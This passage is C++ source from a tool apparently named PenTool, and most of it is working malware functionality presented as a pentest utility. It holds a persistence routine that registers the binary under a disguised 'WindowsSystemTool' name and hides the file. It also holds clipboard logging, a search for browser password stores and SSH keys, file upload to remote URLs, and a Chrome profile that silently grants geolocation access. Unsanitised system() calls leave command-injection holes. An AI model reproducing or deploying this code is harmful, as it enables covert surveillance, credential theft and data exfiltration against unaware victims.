                    case MIB_TCP_STATE_CLOSE_WAIT: conn.state = "CLOSE_WAIT"; break;
                    case MIB_TCP_STATE_CLOSING: conn.state = "CLOSING"; break;
                    case MIB_TCP_STATE_LAST_ACK: conn.state = "LAST_ACK"; break;
                    case MIB_TCP_STATE_TIME_WAIT: conn.state = "TIME_WAIT"; break;
                    case MIB_TCP_STATE_DELETE_TCB: conn.state = "DELETE_TCB"; break;
                    default: conn.state = "UNKNOWN"; break;
                }
                
                connections.push_back(conn);
            }
            
            free(pTcpTable);
        #else
            std::ifstream file("/proc/net/tcp");
            if (!file) return connections;
            
            std::string line;
            std::getline(file, line); // Skip header
            
            while (std::getline(file, line) && connections.size() < MAX_NETWORK_CONNS) {
                unsigned long local_addr, remote_addr;
                int local_port, remote_port, state, uid;
                
                if (sscanf(line.c_str(), "%*d: %lx:%x %lx:%x %x %*x:%*x %*x:%*x %*x %d",
                           &local_addr, &local_port, &remote_addr, &remote_port, &state, &uid) < 6) {
                    continue;
                }
                
                NetworkConn conn;
                
                // Convert IP addresses
                struct in_addr addr;
                addr.s_addr = htonl(local_addr);
                conn.local_addr = inet_ntoa(addr);
                conn.local_port = local_port;
                
                addr.s_addr = htonl(remote_addr);
                conn.remote_addr = inet_ntoa(addr);
                conn.remote_port = remote_port;
                
                // Get process info (simplified)
                conn.pid = -1; // Would need /proc/<pid>/fd scanning
                
                // State
                switch (state) {
                    case 1: conn.state = "ESTABLISHED"; break;
                    case 2: conn.state = "SYN_SENT"; break;
                    case 3: conn.state = "SYN_RECV"; break;
                    case 4: conn.state = "FIN_WAIT1"; break;
                    case 5: conn.state = "FIN_WAIT2"; break;
                    case 6: conn.state = "TIME_WAIT"; break;
                    case 7: conn.state = "CLOSE"; break;
                    case 8: conn.state = "CLOSE_WAIT"; break;
                    case 9: conn.state = "LAST_ACK"; break;
                    case 10: conn.state = "LISTEN"; break;
                    case 11: conn.state = "CLOSING"; break;
                    default: conn.state = "UNKNOWN"; break;
                }
                
                connections.push_back(conn);
            }
        #endif
        
        return connections;
    }
    
    // Real-time monitoring thread function
    void realtime_monitor() {
        auto prev_processes = get_processes();
        auto prev_connections = get_network_connections();
        
        while (realtime_monitoring) {
            auto curr_processes = get_processes();
            auto curr_connections = get_network_connections();
            
            // Check for new processes
            for (const auto& curr_proc : curr_processes) {
                bool found = false;
                for (const auto& prev_proc : prev_processes) {
                    if (curr_proc.pid == prev_proc.pid) {
                        found = true;
                        break;
                    }
                }
                
                if (!found) {
                    std::cout << "[MONITOR] New process: " << curr_proc.name << " (PID: " << curr_proc.pid << ")\n";
                }
            }
            
            // Check for new connections
            for (const auto& curr_conn : curr_connections) {
                bool found = false;
                for (const auto& prev_conn : prev_connections) {
                    if (curr_conn.local_addr == prev_conn.local_addr &&
                        curr_conn.local_port == prev_conn.local_port &&
                        curr_conn.remote_addr == prev_conn.remote_addr &&
                        curr_conn.remote_port == prev_conn.remote_port) {
                        found = true;
                        break;
                    }
                }
                
                if (!found && curr_conn.state == "ESTABLISHED") {
                    std::cout << "[MONITOR] New connection: " << curr_conn.local_addr << ":" << curr_conn.local_port
                              << " -> " << curr_conn.remote_addr << ":" << curr_conn.remote_port
                              << " (PID: " << curr_conn.pid << ")\n";
                }
            }
            
            // Update previous state
            prev_processes = curr_processes;
            prev_connections = curr_connections;
            
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }
    
    // Start real-time monitoring
    void start_realtime_monitoring(const std::vector<std::string>& args) {
        if (realtime_monitoring) {
            std::cout << "Real-time monitoring is already running\n";
            return;
        }
        
        std::cout << "\n[Real-Time Monitoring]\n";
        std::cout << "Starting real-time activity monitoring...\n";
        
        realtime_monitoring = true;
        monitor_thread = std::thread(&PenTool::realtime_monitor, this);
        monitor_thread.detach();
        
        log_action("Started real-time monitoring");
    }
    
    // Show monitoring data
    void show_monitoring_data(const std::vector<std::string>& args) {
        std::cout << "\n[Monitoring Data]\n";
        
        auto processes = get_processes();
        auto connections = get_network_connections();
        
        std::cout << "\nRunning Processes (" << processes.size() << "):\n";
        for (const auto& proc : processes) {
            std::cout << "PID: " << std::left << std::setw(6) << proc.pid 
                      << " | Name: " << std::setw(20) << proc.name 
                      << " | User: " << proc.user << "\n";
        }
        
        std::cout << "\nNetwork Connections (" << connections.size() << "):\n";
        for (const auto& conn : connections) {
            std::cout << std::left << std::setw(15) << conn.local_addr << ":" << std::setw(5) << conn.local_port
                      << " -> " << std::setw(15) << conn.remote_addr << ":" << std::setw(5) << conn.remote_port
                      << " " << conn.state << " (PID: " << conn.pid << ")\n";
        }
        
        log_action("Monitoring data displayed");
    }
    
    // Get IP address
    void get_ip_address(std::string& ip) {
        #ifdef _WIN32
            WSADATA wsaData;
            if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
                ip = "127.0.0.1";
                return;
            }
            
            char hostname[256];
            if (gethostname(hostname, sizeof(hostname)) != 0) {
                ip = "127.0.0.1";
                WSACleanup();
                return;
            }
            
            struct hostent *host = gethostbyname(hostname);
            if (host == NULL) {
                ip = "127.0.0.1";
                WSACleanup();
                return;
            }
            
            ip = inet_ntoa(*(struct in_addr *)host->h_addr_list[0]);
            WSACleanup();
        #else
            struct ifaddrs *ifaddr, *ifa;
            
            if (getifaddrs(&ifaddr) == -1) {
                ip = "127.0.0.1";
                return;
            }
            
            for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
                if (ifa->ifa_addr == NULL) continue;
                
                int family = ifa->ifa_addr->sa_family;
                
                if (family == AF_INET && std::string(ifa->ifa_name) != "lo") {
                    struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
                    ip = inet_ntoa(addr->sin_addr);
                    break;
                }
            }
            
            freeifaddrs(ifaddr);
            
            if (ip.empty()) {
                ip = "127.0.0.1";
            }
        #endif
    }
    
    // Device info
    void device_info(const std::vector<std::string>& args) {
        std::cout << "\n[Device Information]\n";
        
        // System info
        std::cout << "\nSystem Information:\n";
        #ifdef _WIN32
            std::string output = execute_command("systeminfo");
        #else
            std::string output = execute_command("uname -a");
        #endif
        std::cout << output << "\n";
        
        // CPU info
        std::cout << "\nCPU Information:\n";
        #ifdef _WIN32
            output = execute_command("wmic cpu get name,numberofcores,numberoflogicalprocessors");
        #else
            output = execute_command("lscpu");
        #endif
        std::cout << output << "\n";
        
        // Memory info
        std::cout << "\nMemory Information:\n";
        #ifdef _WIN32
            output = execute_command("wmic memorychip get capacity,speed,partnumber");
        #else
            output = execute_command("free -h");
        #endif
        std::cout << output << "\n";
        
        // Disk info
        std::cout << "\nDisk Information:\n";
        #ifdef _WIN32
            output = execute_command("wmic diskdrive get model,size,interfacetype");
        #else
            output = execute_command("lsblk");
        #endif
        std::cout << output << "\n";
        
        // Network info
        std::cout << "\nNetwork Information:\n";
        std::string ip;
        get_ip_address(ip);
        std::cout << "IP Address: " << ip << "\n";
        #ifdef _WIN32
            output = execute_command("ipconfig /all");
        #else
            output = execute_command("ifconfig -a");
        #endif
        std::cout << output << "\n";
        
        log_action("Device information retrieved");
    }
    
    // Wallpaper changer
    void wallpaper_changer(const std::vector<std::string>& args) {
        if (args.empty()) {
            std::cout << "Usage: wallpaper <image_path>\n";
            return;
        }
        
        std::cout << "\n[Wallpaper Changer]\n";
        
        #ifdef _WIN32
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)args[0].c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
            std::cout << "Wallpaper changed to " << args[0] << "\n";
        #else
            std::cout << "Changing wallpaper (Linux implementation)\n";
            std::string cmd = "gsettings set org.gnome.desktop.background picture-uri file://" + args[0];
            system(cmd.c_str());
            std::cout << "Wallpaper changed to " << args[0] << "\n";
        #endif
        
        log_action("Wallpaper changed");
    }

// Send desktop notification
void send_notification(const std::vector<std::string>& args) {
    if (args.empty()) {
        std::cout << "Usage: notify <title> [message]\n";
        return;
    }

    std::string title = args[0];
    std::string message = args.size() > 1 ? args[1] : "";

    #ifdef _WIN32
        // Windows notification using PowerShell
        std::string cmd = "powershell -Command \"[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null; "
                         "$template = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02); "
                         "$textNodes = $template.GetElementsByTagName('text'); "
                         "$textNodes[0].AppendChild($template.CreateTextNode('" + title + "')) | Out-Null; "
                         "$textNodes[1].AppendChild($template.CreateTextNode('" + message + "')) | Out-Null; "
                         "$toast = [Windows.UI.Notifications.ToastNotification]($template); "
                         "[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('PenTool').Show($toast)\"";
        system(cmd.c_str());
    #else
        // Linux notification using notify-send command
        std::string cmd = "notify-send \"" + title + "\" \"" + message + "\"";
        int result = system(cmd.c_str());
        if (result != 0) {
            std::cout << "Warning: Failed to send notification. Make sure 'libnotify-bin' or 'notify-send' is installed.\n";
        }
    #endif

    std::cout << "Notification sent\n";
    log_action("Sent notification: " + title);
}

// Run script file
void run_script(const std::vector<std::string>& args) {
    if (args.empty()) {
        std::cout << "Usage: script <script_file>\n";
        return;
    }

    std::string script_file = args[0];
    
    // Check if the script file exists
    if (!fs::exists(script_file)) {
        std::cout << "Error: Script file not found: " << script_file << "\n";
        return;
    }

    std::cout << "Executing script: " << script_file << "\n";

    // Read and execute the script line by line
    std::ifstream file(script_file);
    if (!file.is_open()) {
        std::cout << "Error: Could not open script file\n";
        return;
    }

    std::string line;
    while (std::getline(file, line)) {
        // Skip empty lines and comments
        if (line.empty() || line[0] == '#') {
            continue;
        }

        std::cout << "> " << line << "\n";

        // Parse the command and arguments
        std::vector<std::string> cmd_args;
        std::istringstream iss(line);
        std::string token;
        
        while (iss >> token) {
            cmd_args.push_back(token);
        }

        if (!cmd_args.empty()) {
            // Find and execute the command
            bool found = false;
            std::vector<std::string> args;
            if (cmd_args.size() > 1) {
                args.assign(cmd_args.begin() + 1, cmd_args.end());
            }
            
            for (const auto& cmd : commands) {
                if (cmd.name == cmd_args[0]) {
                    cmd.func(args);
                    found = true;
                    break;
                }
            }
            
            if (!found) {
                std::cout << "Unknown command: " << cmd_args[0] << "\n";
            }
        }
    }

    std::cout << "Script execution completed\n";
    log_action("Executed script: " + script_file);
}

// SSL/TLS certificate check
void ssl_check(const std::vector<std::string>& args) {
    if (args.empty()) {
        std::cout << "Usage: ssl <hostname> [port]\n";
        return;
    }

    std::string hostname = args[0];
    int port = 443;
    if (args.size() > 1) {
        try {
            port = std::stoi(args[1]);
        } catch (...) {
            port = 443;
        }
    }

    std::cout << "\n[SSL/TLS Certificate Check]\n";
    std::cout << "Checking certificate for: " << hostname << ":" << port << "\n";

    #ifdef _WIN32
        // Windows implementation using PowerShell
        std::string cmd = "powershell -Command \"$tcpClient = New-Object System.Net.Sockets.TcpClient('" + hostname + "', " + std::to_string(port) + "); "
                         "$sslStream = New-Object System.Net.Security.SslStream($tcpClient.GetStream()); "
                         "$sslStream.AuthenticateAsClient('" + hostname + "'); "
                         "$cert = $sslStream.RemoteCertificate; "
                         "$cert2 = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($cert); "
                         "Write-Host 'Subject: ' $cert2.Subject; "
                         "Write-Host 'Issuer: ' $cert2.Issuer; "
                         "Write-Host 'Valid From: ' $cert2.NotBefore; "
                         "Write-Host 'Valid To: ' $cert2.NotAfter; "
                         "Write-Host 'Thumbprint: ' $cert2.Thumbprint; "
                         "$sslStream.Close(); $tcpClient.Close();\"";
        std::string output = execute_command(cmd);
        std::cout << output << "\n";
    #else
        // Linux implementation using OpenSSL
        std::string cmd = "echo | openssl s_client -connect " + hostname + ":" + std::to_string(port) + " 2>/dev/null | openssl x509 -noout -dates -issuer -subject";
        std::string output = execute_command(cmd);
        std::cout << output << "\n";
    #endif

    log_action("SSL certificate check for: " + hostname);
}

// Website crawling
void web_crawler(const std::vector<std::string>& args) {
    if (args.empty()) {
        std::cout << "Usage: crawl <url> [depth]\n";
        return;
    }

    std::string url = args[0];
    int depth = 1;
    if (args.size() > 1) {
        try {
            depth = std::stoi(args[1]);
        } catch (...) {
            depth = 1;
        }
    }

    std::cout << "\n[Website Crawler]\n";
    std::cout << "Crawling: " << url << " (depth: " << depth << ")\n";

    #ifdef _WIN32
        // Windows implementation using PowerShell
        std::string cmd = "powershell -Command \"$web = Invoke-WebRequest -Uri '" + url + "'; "
                         "$links = $web.Links.Href | Where-Object { $_ -like 'http*' } | Select-Object -Unique; "
                         "Write-Host 'Found ' ($links.Count) ' links:'; "
                         "foreach ($link in $links) { Write-Host $link }\"";
        std::string output = execute_command(cmd);
        std::cout << output << "\n";
    #else
        // Linux implementation using curl and grep
        std::string cmd = "curl -s " + url + " | grep -o 'href=\"[^\"]*\"' | cut -d'\"' -f2 | grep '^http'";
        std::string output = execute_command(cmd);
        std::cout << output << "\n";
    #endif

    log_action("Website crawl for: " + url);
}

// Detailed live process monitoring
void process_monitor(const std::vector<std::string>& args) {
    std::cout << "\n[Process Monitor]\n";
    std::cout << "Starting detailed process monitoring...\n";
    std::cout << "Press Ctrl+C to stop monitoring\n\n";

    // Create a separate thread for monitoring
    std::thread monitor_thread([this]() {
        auto prev_processes = get_processes();
        
        while (true) {
            auto curr_processes = get_processes();
            
            // Check for new processes
            for (const auto& curr_proc : curr_processes) {
                bool found = false;
                for (const auto& prev_proc : prev_processes) {
                    if (curr_proc.pid == prev_proc.pid) {
                        found = true;
                        break;
                    }
                }
                
                if (!found) {
                    std::cout << "[NEW] PID: " << std::left << std::setw(6) << curr_proc.pid 
                              << " | Name: " << std::setw(20) << curr_proc.name 
                              << " | User: " << curr_proc.user << "\n";
                }
            }
            
            // Check for terminated processes
            for (const auto& prev_proc : prev_processes) {
                bool found = false;
                for (const auto& curr_proc : curr_processes) {
                    if (curr_proc.pid == prev_proc.pid) {
                        found = true;
                        break;
                    }
                }
                
                if (!found) {
                    std::cout << "[TERM] PID: " << std::left << std::setw(6) << prev_proc.pid 
                              << " | Name: " << std::setw(20) << prev_proc.name 
                              << " | User: " << prev_proc.user << "\n";
                }
            }
            
            // Update previous state
            prev_processes = curr_processes;
            
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    });
    
    // Detach the thread so it runs independently
    monitor_thread.detach();
    
    log_action("Started process monitoring");
}

// Manage scheduled tasks
void manage_tasks(const std::vector<std::string>& args) {
    if (args.empty()) {
        std::cout << "Usage: task <list|create|delete> [args]\n";
        return;
    }

    std::string action = args[0];

    if (action == "list") {
        std::cout << "\n[Scheduled Tasks]\n";
        
        #ifdef _WIN32
            std::string output = execute_command("schtasks /query /fo LIST");
            std::cout << output << "\n";
        #else
            std::string output = execute_command("crontab -l");
            std::cout << output << "\n";
        #endif
    } 
    else if (action == "create") {
        if (args.size() < 3) {
            std::cout << "Usage: task create <name> <command>\n";
            return;
        }
        
        std::string name = args[1];
        std::string command;
        for (size_t i = 2; i < args.size(); i++) {
            if (i > 2) command += " ";
            command += args[i];
        }
        
        #ifdef _WIN32
            std::string cmd = "schtasks /create /tn \"" + name + "\" /tr \"" + command + "\" /sc daily /st 00:00";
            int result = system(cmd.c_str());
            if (result == 0) {
                std::cout << "Task created successfully\n";
            } else {
                std::cout << "Failed to create task\n";
            }
        #else
            std::string cmd = "(crontab -l 2>/dev/null; echo \"0 0 * * * " + command + "\") | crontab -";
            int result = system(cmd.c_str());
            if (result == 0) {
                std::cout << "Task created successfully\n";
            } else {
                std::cout << "Failed to create task\n";
            }
        #endif
    }
    else if (action == "delete") {
        if (args.size() < 2) {
            std::cout << "Usage: task delete <name>\n";
            return;
        }
        
        std::string name = args[1];
        
        #ifdef _WIN32
            std::string cmd = "schtasks /delete /tn \"" + name + "\" /f";
            int result = system(cmd.c_str());
            if (result == 0) {
                std::cout << "Task deleted successfully\n";
            } else {
                std::cout << "Failed to delete task\n";
            }
        #else
            std::cout << "Task deletion not implemented for Linux\n";
        #endif
    }
    else {
        std::cout << "Unknown task action: " << action << "\n";
    }
    
    log_action("Task management: " + action);
}

// List loaded drivers
void list_drivers(const std::vector<std::string>& args) {
    std::cout << "\n[Loaded Drivers]\n";
    
    #ifdef _WIN32
        std::string output = execute_command("driverquery");
        std::cout << output << "\n";
    #else
        std::string output = execute_command("lsmod");
        std::cout << output << "\n";
    #endif
    
    log_action("Listed loaded drivers");
}

// Hide process from task manager
void hide_process(const std::vector<std::string>& args) {
    std::cout << "\n[Process Hiding]\n";
    
    // Get the current executable path
    char exe_path[MAX_PATH_LENGTH];
    #ifdef _WIN32
        GetModuleFileName(NULL, exe_path, MAX_PATH_LENGTH);
    #else
        ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
        if (len == -1) {
            std::cout << "Failed to get executable path\n";
            return;
        }
        exe_path[len] = '\0';
    #endif
    
    std::string exe_name = fs::path(exe_path).filename().string();
    
    // Add to startup
    #ifdef _WIN32
        // Registry startup
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_CURRENT_USER, 
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueEx(hKey, "WindowsSystemTool", 0, REG_SZ, (BYTE*)exe_path, strlen(exe_path));
            RegCloseKey(hKey);
            std::cout << "Added to registry startup\n";
        }
        
        // Task scheduler startup
        std::string cmd = "schtasks /create /tn \"WindowsSystemTool\" /tr \"" + std::string(exe_path) + "\" /sc onlogon /rl HIGHEST /f";
        system(cmd.c_str());
        std::cout << "Added to task scheduler\n";
        
        // Hide file attributes
        cmd = "attrib +h +s \"" + std::string(exe_path) + "\"";
        system(cmd.c_str());
        std::cout << "Set hidden and system attributes\n";
    #else
        // Linux startup
        std::string startup_dir = std::string(getenv("HOME")) + "/.config/autostart/";
        fs::create_directories(startup_dir);
        
        std::string desktop_file = startup_dir + "windows-system-tool.desktop";
        std::ofstream file(desktop_file);
        if (file.is_open()) {
            file << "[Desktop Entry]\n";
            file << "Type=Application\n";
            file << "Name=Windows System Tool\n";
            file << "Exec=" << exe_path << "\n";
            file << "Hidden=true\n";
            file.close();
            std::cout << "Added to autostart\n";
        }
        
        // Hide file
        std::string hidden_path = std::string(getenv("HOME")) + "/.system-tool";
        fs::copy_file(exe_path, hidden_path, fs::copy_options::overwrite_existing);
        std::string cmd = "chmod +x " + hidden_path;
        system(cmd.c_str());
        std::cout << "Created hidden copy at: " << hidden_path << "\n";
    #endif
    
    log_action("Enabled process hiding and persistence");
}

// Monitor clipboard contents
void clipboard_monitor(const std::vector<std::string>& args) {
    std::cout << "\n[Clipboard Monitor]\n";
    std::cout << "Monitoring clipboard contents...\n";
    std::cout << "Press Ctrl+C to stop monitoring\n\n";

    // Create a separate thread for monitoring
    std::thread monitor_thread([this]() {
        std::string last_content = "";
        
        while (true) {
            std::string current_content = "";
            
            #ifdef _WIN32
                // Windows clipboard
                if (OpenClipboard(NULL)) {
                    HANDLE hData = GetClipboardData(CF_TEXT);
                    if (hData != NULL) {
                        char* pszText = static_cast<char*>(GlobalLock(hData));
                        if (pszText != NULL) {
                            current_content = pszText;
                            GlobalUnlock(hData);
                        }
                    }
                    CloseClipboard();
                }
            #else
                // Linux clipboard using xclip
                FILE* pipe = popen("xclip -o -selection clipboard 2>/dev/null", "r");
                if (pipe) {
                    char buffer[128];
                    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
                        current_content += buffer;
                    }
                    pclose(pipe);
                }
            #endif
            
            if (current_content != last_content && !current_content.empty()) {
                std::cout << "[CLIPBOARD] " << current_content << "\n";
                
                // Log to file
                std::ofstream logFile("clipboard_log.txt", std::ios::app);
                if (logFile.is_open()) {
                    auto now = std::chrono::system_clock::now();
                    std::time_t time = std::chrono::system_clock::to_time_t(now);
                    std::string time_str = std::ctime(&time);
                    time_str.pop_back(); // Remove newline
                    
                    logFile << "[" << time_str << "] " << current_content << "\n";
                    logFile.close();
                }
                
                last_content = current_content;
            }
            
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    });
    
    // Detach the thread so it runs independently
    monitor_thread.detach();
    
    log_action("Started clipboard monitoring");
}

// Upload file to remote system
void upload_file(const std::vector<std::string>& args) {
    if (args.empty()) {
        std::cout << "Usage: upload <file_path> [remote_url]\n";
        return;
    }

    std::string file_path = args[0];
    std::string remote_url = args.size() > 1 ? args[1] : "";

    // Check if the file exists
    if (!fs::exists(file_path)) {
        std::cout << "Error: File not found: " << file_path << "\n";
        return;
    }

    std::cout << "Uploading file: " << file_path << "\n";

    if (remote_url.empty()) {
        std::cout << "No remote URL specified. Using default upload method.\n";
        
        #ifdef _WIN32
            // Windows upload using PowerShell
            std::string cmd = "powershell -Command \"$file = '" + file_path + "'; "
                             "$bytes = [System.IO.File]::ReadAllBytes($file); "
                             "$base64 = [System.Convert]::ToBase64String($bytes); "
                             "Write-Host 'File size: ' $bytes.Length ' bytes'; "
                             "Write-Host 'Base64 length: ' $base64.Length; "
                             "Write-Host 'First 100 chars of base64: ' $base64.Substring(0, [Math]::Min(100, $base64.Length))\"";
            std::string output = execute_command(cmd);
            std::cout << output << "\n";
        #else
            // Linux upload using curl
            std::string cmd = "curl -F \"file=@" + file_path + "\" https://httpbin.org/post";
            std::string output = execute_command(cmd);
            std::cout << output << "\n";
        #endif
    } else {
        std::cout << "Uploading to: " << remote_url << "\n";
        
        #ifdef _WIN32
            // Windows upload using PowerShell
            std::string cmd = "powershell -Command \"$file = '" + file_path + "'; "
                             "$uri = '" + remote_url + "'; "
                             "$webClient = New-Object System.Net.WebClient; "
                             "$webClient.UploadFile($uri, $file); "
                             "Write-Host 'Upload completed'\"";
            std::string output = execute_command(cmd);
            std::cout << output << "\n";
        #else
            // Linux upload using curl
            std::string cmd = "curl -F \"file=@" + file_path + "\" " + remote_url;
            std::string output = execute_command(cmd);
            std::cout << output << "\n";
        #endif
    }

    log_action("Uploaded file: " + file_path);
}

// List available tokens (Windows)
void list_tokens(const std::vector<std::string>& args) {
    std::cout << "\n[Available Tokens]\n";
    
    #ifdef _WIN32
        // Windows tokens using PowerShell
        std::string output = execute_command("powershell -Command \"Get-ChildItem -Path 'Registry::HKEY_USERS' -Name | Where-Object { $_ -match 'S-1-5-21-.*' } | ForEach-Object { Write-Host 'User SID: ' $_ }\"");
        std::cout << output << "\n";
        
        output = execute_command("powershell -Command \"whoami /all\"");
        std::cout << output << "\n";
    #else
        std::cout << "Token listing not implemented for Linux\n";
    #endif
    
    log_action("Listed available tokens");
}

// Search for password files
void search_passwords(const std::vector<std::string>& args) {
    std::cout << "\n[Password Search]\n";
    
    // Common password file locations
    std::vector<std::string> search_paths = {
        #ifdef _WIN32
            std::string(getenv("USERPROFILE")) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
            std::string(getenv("USERPROFILE")) + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
            std::string(getenv("APPDATA")) + "\\FileZilla\\sitemanager.xml",
            std::string(getenv("APPDATA")) + "\\FileZilla\\recentservers.xml",
        #else
            std::string(getenv("HOME")) + "/.config/google-chrome/Default/Login Data",
            std::string(getenv("HOME")) + "/.mozilla/firefox/*.default*",
            std::string(getenv("HOME")) + "/.config/filezilla/sitemanager.xml",
            std::string(getenv("HOME")) + "/.config/filezilla/recentservers.xml",
            std::string(getenv("HOME")) + "/.ssh/id_rsa",
            std::string(getenv("HOME")) + "/.ssh/id_dsa",
        #endif
    };

    for (const auto& path : search_paths) {
        if (fs::exists(path)) {
            std::cout << "Found potential password file: " << path << "\n";
        }
    }
    
    // Search for password-related files
    std::vector<std::string> password_keywords = {
        "password", "passwd", "pwd", "credential", "login", "auth", "secret", "key"
    };
    
    std::cout << "\nSearching for files with password-related names...\n";
    
    for (const auto& keyword : password_keywords) {
        std::string cmd;
        
        #ifdef _WIN32
            cmd = "dir /s /b " + std::string(getenv("USERPROFILE")) + "\\*password*";
        #else
            cmd = "find " + std::string(getenv("HOME")) + " -name '*" + keyword + "*' 2>/dev/null";
        #endif
        
        std::string output = execute_command(cmd);
        if (!output.empty()) {
            std::cout << "Files containing '" << keyword << "':\n" << output << "\n";
        }
    }
    
    log_action("Searched for password files");
}
    
    // Enhanced file dump
    void enhanced_file_dump(const std::vector<std::string>& args) {
        std::cout << "\n[Enhanced File Dump]\n";
        
        std::string path = args.empty() ? current_dir : args[0];
        std::string output_file;
        
        if (args.size() < 2) {
            auto now = std::chrono::system_clock::now();
            std::time_t time = std::chrono::system_clock::to_time_t(now);
            std::tm* t = std::localtime(&time);
            
            char filename[MAX_PATH_LENGTH];
            snprintf(filename, sizeof(filename), "dump_%04d%02d%02d_%02d%02d%02d.txt",
                    t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                    t->tm_hour, t->tm_min, t->tm_sec);
            output_file = filename;
        } else {
            output_file = args[1];
        }
        
        std::ofstream file(output_file);
        if (!file) {
            std::cout << "Failed to create output file " << output_file << "\n";
            return;
        }
        
        file << "=== Directory Structure ===\n";
        
        try {
            for (const auto& entry : fs::directory_iterator(path)) {
                if (fs::is_directory(entry.status())) {
                    file << "[DIR]  " << entry.path().filename() << "\n";
                } else {
                    try {
                        file << "[FILE] " << entry.path().filename() << " (" 
                             << fs::file_size(entry.path()) << " bytes)\n";
                    } catch (...) {
                        file << "[FILE] " << entry.path().filename() << " (unknown size)\n";
                    }
                }
            }
        } catch (const std::exception& e) {
            file << "Could not open directory " << path << "\n";
            file.close();
            return;
        }
        
        file << "\n=== File Contents (Text Files) ===\n";
        
        try {
            for (const auto& entry : fs::directory_iterator(path)) {
                if (fs::is_regular_file(entry.status())) {
                    std::string filename = entry.path().filename().string();
                    if (filename.find(".txt") != std::string::npos || 
                        filename.find(".log") != std::string::npos || 
                        filename.find(".conf") != std::string::npos || 
                        filename.find(".ini") != std::string::npos) {
                        
                        std::ifstream infile(entry.path());
                        if (infile) {
                            file << "\nFile: " << entry.path() << "\n";
                            file << infile.rdbuf();
                            file << "\n==================================================\n";
                        }
                    }
                }
            }
        } catch (const std::exception& e) {
            // Continue with other sections
        }
        
        file << "\n=== System Information ===\n";
        
        auto processes = get_processes();
        file << "\nRunning Processes:\n";
        for (const auto& proc : processes) {
            file << "PID: " << std::left << std::setw(6) << proc.pid 
                 << " | Name: " << std::setw(20) << proc.name 
                 << " | User: " << proc.user << "\n";
        }
        
        auto connections = get_network_connections();
        file << "\nNetwork Connections:\n";
        for (const auto& conn : connections) {
            file << std::left << std::setw(15) << conn.local_addr << ":" << std::setw(5) << conn.local_port
                 << " -> " << std::setw(15) << conn.remote_addr << ":" << std::setw(5) << conn.remote_port
                 << " " << conn.state << " (PID: " << conn.pid << ")\n";
        }
        
        file.close();
        std::cout << "Dump saved to " << output_file << "\n";
        log_action("Enhanced file dump created");
    }
    
void geolocation_tracker_impl(int port) {
    std::cout << "Starting geolocation tracker on port " << port << "\n";
    std::cout << "Waiting for location data...\n";
    
    // Generate unique profile directory with timestamp and random string
    std::string timestamp = std::to_string(std::time(nullptr));
    std::string random_str = std::to_string(rand() % 10000);
    std::string profileDir;
    
    int actualPort = port;
    bool portFound = false;
    
    // Vector to store geolocation results
    std::vector<std::string> geoloc_results;
    std::mutex results_mutex;
    
    #ifdef _WIN32
        // Windows implementation
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "WSAStartup failed\n";
            return;
        }
        
        SOCKET server_fd = INVALID_SOCKET;
        struct sockaddr_in address;
        
        // Try to bind to the specified port or find an available one
        for (int attempt = 0; attempt < 10; attempt++) {
            actualPort = port + attempt;
            server_fd = socket(AF_INET, SOCK_STREAM, 0);
            if (server_fd == INVALID_SOCKET) {
                std::cerr << "Socket creation failed\n";
                WSACleanup();
                return;
            }
            
            // Set socket options
            int opt = 1;
            if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt)) < 0) {
                std::cerr << "Setsockopt failed\n";
                closesocket(server_fd);
                continue;
            }
            
            address.sin_family = AF_INET;
            address.sin_addr.s_addr = INADDR_ANY;
            address.sin_port = htons(actualPort);
            
            if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) == 0) {
                portFound = true;
                break;
            }
            
            closesocket(server_fd);
        }
        
        if (!portFound) {
            std::cerr << "Failed to bind to any port in range " << port << "-" << port+9 << "\n";
            WSACleanup();
            return;
        }
        
        std::cout << "Successfully bound to port " << actualPort << "\n";
        
        if (listen(server_fd, 10) < 0) {
            std::cerr << "Listen failed\n";
            closesocket(server_fd);
            WSACleanup();
            return;
        }
        
        // Create unique profile directory in system temp location
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        profileDir = std::string(tempPath) + "chrome-instance-" + timestamp + "-" + random_str;
        
        // Clean up any existing profile with same name
        std::string cleanupCmd = "rmdir /s /q \"" + profileDir + "\" 2>nul";
        system(cleanupCmd.c_str());
        
        // Create directory
        std::string mkdirCmd = "mkdir \"" + profileDir + "\"";
        system(mkdirCmd.c_str());
        
        // Create Default subdirectory
        mkdirCmd = "mkdir \"" + profileDir + "\\Default\"";
        system(mkdirCmd.c_str());
        
        // Write preferences file
        std::ofstream prefs(profileDir + "\\Default\\Preferences");
        prefs << R"({"profile": {
"content_settings": {
"exceptions": {
"geolocation": {
"http://localhost:)" << actualPort << R"(,": {
"last_modified": "13372223456789000",
"setting": 1
},
"[.]localhost,*": {
"last_modified": "13372223456789000",
"setting": 1
}
}
}
},
"default_content_setting_values": {
"geolocation": 1
}
}
})";
        prefs.close();
        
        // Kill any existing Chrome processes before launching new one
        system("taskkill /F /IM chrome.exe /T 2>nul");
        
        // Launch Chrome with completely new instance
